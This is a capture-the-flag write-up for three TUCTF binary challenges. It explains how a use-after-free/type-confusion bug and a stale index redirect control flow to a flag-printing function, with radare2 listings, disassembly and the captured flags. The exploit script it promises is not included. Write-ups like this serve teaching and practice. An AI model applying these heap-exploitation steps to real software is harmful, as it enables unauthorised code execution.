## Write-up

All three challenges are basciallly the same and you can actually pwn all three
with one exploit. First I'm gonna talk about the common parts and then
about how you can exploit the three challenges.

### WoO Structure

The first one I did was `WoO`, so I'll explain this one first and then explain
the differences to the other versions.

Basically you get dropped into a text-based menu, which allows you to create
different kinds of animals and also delete them.

```
Welcome! I don't think we're in Kansas anymore.
We're about to head off on an adventure!
Select some animals you want to bring along.

Menu Options:
1: Bring a lion
2: Bring a tiger
3: Bring a bear
4: Delete Animal
5: Exit

Enter your choice:
2
Choose the type of tiger you want:
1: Siberian Tiger
2: Bengal Tiger
3: Sumatran Tiger
4: Caspian Tiger
3
Enter name of tiger:
asdf
Menu Options:
1: Bring a lion
2: Bring a tiger
3: Bring a bear
4: Delete Animal
5: Exit

Enter your choice:
5
```

Especially the delete animal option is a strong indicator that there are gonna
be issues with heap allocated objects. Turns out my hunch was right ;)

Let's look at the various functions in the program:

```
[0x004007f0]> afl|grep -v imp
[...]
0x004008dd  124   3     sym.l33tH4x0r
0x00400959  136   4     sym.pickLionType
0x004009e1  129   1     sym.makeLion
0x00400a62  155   4     sym.pickTigerType
0x00400afd  129   1     sym.makeTiger
0x00400b7e  135   4     sym.pickBearType
0x00400c05  157   1     sym.makeBear
0x00400ca2  67    3     sym.pwnMe
0x00400ce5  108   4     sym.deleteAnimal
0x00400d51  206   17    sym.makeStuff
0x00400e1f  81    1     sym.printMenu
0x00400e70  51    1     sym.printWelcome
0x00400ea3  93    4     sym.main
[...]
```

OK we have a lot of reasonable function, like picking the type for the various
kinds of animals and the constructor functions for the animal objects. But
there are also two very intersting functions: `l33H4x0r` and `pwnMe`.

First let's look at the `l33H4x0r` function. Turns out this is a nicety of the
challenge author. It roughly does:

```
f = fopen("flag.txt")
fgets(buf, 0x32, f)
puts(buf)
fflush(stdout)
fclose(f)
```

Nice. So that's where we'll try to redirect our control flow and it will print
the flag for us.

Now before we check out the out the `pwnMe` function, I need to explain some
details about the other functions. We have the `makeStuff` function which
get's called in an infinite loop by the main function. `makeStuff` handles main
menu selection and then dispatches to the other functions. For each kind of
animal there is a `make${ANIMAL}` and a `pick${ANIMAL}Type` function.

When an animal is created a certain fixed amount of space is allocated on the
heap with `malloc` and the type is picked and stored in the object. Then you
can input a name for the animal, A pointer to the object is stored in the
global `pointers` array. The `next` global variable is the index of the next
free index in the pointers array.

The deletion function is also kind of buggy. It doesn't allow deletion of index
0 and doesn't reset the `next` index.

The bear is a little different than the other objects. In the first four bytes
of the bear the constant `0xdeadbeef` is stored. Also when a bear is allocated
and stored into the `pointers` array, the index in the array is stored also in
the bearOffset variable. Next let's take a look at the pwnMe function:

```
/ (fcn) sym.pwnMe 67
|           ; var int local_8h @ rbp-0x8
|           ; var int local_10h @ rbp-0x10
|           ; CALL XREF from 0x00400df8 (sym.makeStuff)
|           0x00400ca2      55             push rbp
|           0x00400ca3      4889e5         mov rbp, rsp
|           0x00400ca6      4883ec10       sub rsp, 0x10
|           0x00400caa      8b0510142000   mov eax, dword [rip + 0x201410] ; [0x6020c0:4]=0x4700342e LEA obj.bearOffset ; ".4" @ 0x6020c0
|           0x00400cb0      4898           cdqe
|           0x00400cb2      488b04c5e020.  mov rax, qword [rax*8 + obj.pointers] ; [0x6020e0:8]=0x322e382e3420 LEA obj.pointers ; " 4.8.2" @ 0x6020e0
|           0x00400cba      488945f0       mov qword [rbp - local_10h], rax
|           0x00400cbe      488b45f0       mov rax, qword [rbp - local_10h]
|           0x00400cc2      8b4014         mov eax, dword [rax + 0x14] ; [0x14:4]=1
|           0x00400cc5      83f803         cmp eax, 3
|       ,=< 0x00400cc8      7511           jne 0x400cdb
|       |   0x00400cca      488b45f0       mov rax, qword [rbp - local_10h]
|       |   0x00400cce      488b00         mov rax, qword [rax]
|       |   0x00400cd1      488945f8       mov qword [rbp - local_8h], rax
|       |   0x00400cd5      488b45f8       mov rax, qword [rbp - local_8h]
|       |   0x00400cd9      ffd0           call rax
|       |   ; JMP XREF from 0x00400cc8 (sym.pwnMe)
|       `-> 0x00400cdb      bf00000000     mov edi, 0
\           0x00400ce0      e8fbfaffff     call sym.imp.exit
```

So what this function does is get the animal at the position `bearOffset` and
checks whether it's type is 3 and if it is, it will fetch first 8 bytes of the
object and `call rax` it.

We can see that this function is called from `makeStuff`. A quick look around
we can see that we have to enter `0x1337` in the menu to trigger `pwnMe`. So
our goal is to create a object at `bearOffset`, where we can control the first
8 bytes, so we can trigger `pwnMe` and redirect control flow to `l33tH4x0r`.

### Exploitation

Actually we can find out a lot through the differences, between the challenges.

- `WoO` uses `scanf(%s)` to read the animal names and `WoO2` and `WoO2 (fixed)`
  use `fgets`. So we have a heap based buffer overflow here.
- `WoO2 (fixed)` initializes `bearOffset` with `-1` and checks for this in
  `pwnMe`.

For `WoO` and `WoO2` we can just create a Tiger object with type 3 and set the
name the address of `l33H4x0r`. Because `bearOffset` will be initialized with
zero it will take the animal at index 0, which is the Tiger object we just
allocated.

The next interesting fact is that `deleteAnimal` doesn't touch `bearOffset`, so
we can allocate a bear, delete it and allocate a different kind of animal at
the same place and `bearOffset` will still point to the same index.  This is a
kind of UAF/type confusion vulnerability and works on all three versions of
the challenge.

I guess `WoO` was supposed to be solved using a heap overflow, but I didn't see
a straight forward way to do that. So I just used the UAF. The flags are

- WoO `TUCTF{H3ap_O_Fl0w_ftw}`
- WoO2 `TUCTF{free_as_in_freedom_I_mean_Use_after_free}`
- WoO2 (fixed) `TUCTF{free_as_in_use_after_free_I_hope-_-}`

This was a fun challenge, although I think in total the points you got for
solving basically one challenge were a little bit too much. A harder version
should've not provided the `l33th4x0r` function.

Here's the python script I used to pwn, although most of it is scripting the
interaction with the program.
